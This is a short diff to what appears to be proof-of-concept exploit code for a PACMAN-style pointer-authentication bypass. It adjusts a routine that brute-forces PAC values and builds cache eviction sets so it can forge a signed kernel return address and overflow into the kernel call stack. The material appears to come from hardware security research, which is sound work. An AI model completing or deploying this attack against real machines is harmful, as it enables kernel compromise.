@@ -34,10 +34,11 @@ void pacman_run() {
 
   // Target address: this is what we want to sign with a forged PAC and
   // buf-overflow into the kernel call stack
-  addr_t target_instr = kmod_get_paddr();
+  addr_t target_paddr = kmod_get_paddr();
+  addr_t target_vaddr = kmod_get_vaddr();
 
   // Eviction set of virtual addresses for the kernel physical address
-  eviction_set_t *evset = evset_v_for_paddr(target_instr, NULL, 0);
+  eviction_set_t *evset = evset_v_for_paddr(target_paddr, NULL, 0);
 
   // Test all the PACs
   for (cur_pac = 0; cur_pac < MAX_PAC; ++cur_pac) {
